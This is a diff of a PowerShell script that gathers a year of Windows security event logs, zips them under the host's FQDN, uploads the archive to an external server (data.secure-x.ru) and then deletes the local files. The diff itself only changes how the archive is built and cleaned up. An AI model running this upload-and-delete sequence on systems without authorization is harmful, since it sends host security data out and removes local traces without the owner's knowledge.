@@ -42,19 +42,16 @@ Get-EventLog security -after (get-date).AddDays(-365) | where {$_.InstanceId -eq
 
 
 echo "CREATING ARCHIVE... `n"
-$myfqdn=(Get-WmiObject win32_computersystem).DNSHostName+"."+(Get-WmiObject win32_computersystem).Domain;
-$compress = @{
-Path = "$ENV:UserProfile\TMP\"
-CompressionLevel = "Optimal"
-DestinationPath = "$ENV:UserProfile\TMP\$myFQDN.zip"
-}
-
-Compress-Archive -Force @compress
+$myfqdn=(Get-WmiObject win32_computersystem).DNSHostName+"."+(Get-WmiObject win32_computersystem).Domain
+Add-Type -Assembly System.IO.Compression.FileSystem
+$source = "$ENV:UserProfile\TMP"
+$destination = "$ENV:UserProfile\$myFQDN.zip"
+[io.compression.zipfile]::CreateFromDirectory($source, $destination)
 
 
 echo "UPLOADING FILES... `n"
 
-$FilePath = "$ENV:UserProfile\TMP\$myFQDN.zip";
+$FilePath = "$ENV:UserProfile\$myFQDN.zip";
 $URL = 'https://data.secure-x.ru';
 $fileBytes = [System.IO.File]::ReadAllBytes($FilePath);
 $content = [Convert]::ToBase64String($fileBytes);
@@ -92,3 +89,4 @@ Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boun
 
 echo "CLEANUP... `n"
 Remove-Item -Path $ENV:UserProfile\TMP -Recurse
+Remove-Item -Path $ENV:UserProfile\$myFQDN.zip
